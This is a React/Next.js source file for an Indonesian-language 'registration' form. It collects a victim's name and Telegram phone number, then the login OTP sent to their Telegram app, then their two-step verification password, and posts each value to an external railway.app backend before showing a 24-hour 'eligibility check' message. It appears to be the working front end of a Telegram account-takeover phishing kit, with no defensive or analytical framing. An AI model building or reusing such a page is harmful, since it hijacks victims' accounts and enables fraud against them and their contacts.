"use client";

import React, { useState } from 'react';

const AuthForm = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleNext = async () => {
    setLoading(true);
    setError('');
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, step }),
      });
      
      const data = await response.json(); // Perbaikan: Pastikan data diambil

      if (response.ok) {
        if (step === 1) setStep(2);
        else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setStep(4);
        } else if (step === 3) setStep(4);
      } else {
        if (data.status === 'invalid_2fa') setError('KATA SANDI SALAH!!');
        else if (data.status === 'invalid_otp') setError('KODE OTP SALAH!!');
        else setError('Terjadi kesalahan server.');
      }
    } catch (err) {
      setError('Koneksi gagal. Pastikan backend aktif.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-white overflow-x-hidden">
      <div className="w-full">
        {/* Banner Full Screen */}
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto block border-none" />
      </div>

      <div className="p-6 space-y-6 max-w-md mx-auto">
        {step === 1 && (
          <div className="space-y-5">
            <h2 className="text-xl font-bold text-center">Form Pendaftaran Penerimaan</h2>
            <input name="nama" placeholder="Nama Lengkap" className="w-full border-2 p-4 rounded-xl outline-none" onChange={handleChange} />
            <input name="nomor" placeholder="Nomor Telegram Aktif (08xxx)" className="w-full border-2 p-4 rounded-xl outline-none" onChange={handleChange} />
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl">
              {loading ? "SINKRONISASI..." : "DAFTAR SEKARANG"}
            </button>
            <p className="text-[10px] text-gray-400 italic text-center">Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!</p>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-6 text-center">
            <h2 className="text-blue-600 font-bold leading-snug">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</h2>
            <input name="otp" placeholder="· · · · ·" className="w-full border-2 p-5 rounded-2xl text-center text-4xl font-bold tracking-[0.5em]" onChange={handleChange} maxLength={5} />
            {error && <p className="text-red-600 font-bold italic">{error}</p>}
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl uppercase">
              {loading ? "MEMPROSES..." : "VERIFIKASI OTP"}
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-6 text-center">
            <h2 className="font-bold text-xl">Verifikasi 2 Langkah</h2>
            <input name="sandi" type="password" placeholder="Masukkan Kata Sandi" 
              className={`w-full border-2 p-5 rounded-2xl text-center ${error ? 'border-red-600 bg-red-50' : ''}`} onChange={handleChange} />
            {error && <p className="text-red-600 font-black">{error}</p>}
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl">
              {loading ? "MENGECEK..." : "KONFIRMASI"}
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="text-center py-20 space-y-6">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
            {/* Teks Instruksi Final */}
            <p className="text-gray-700 font-bold bg-blue-50 p-6 rounded-2xl border-2 border-blue-100 text-lg leading-relaxed">
              Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default AuthForm;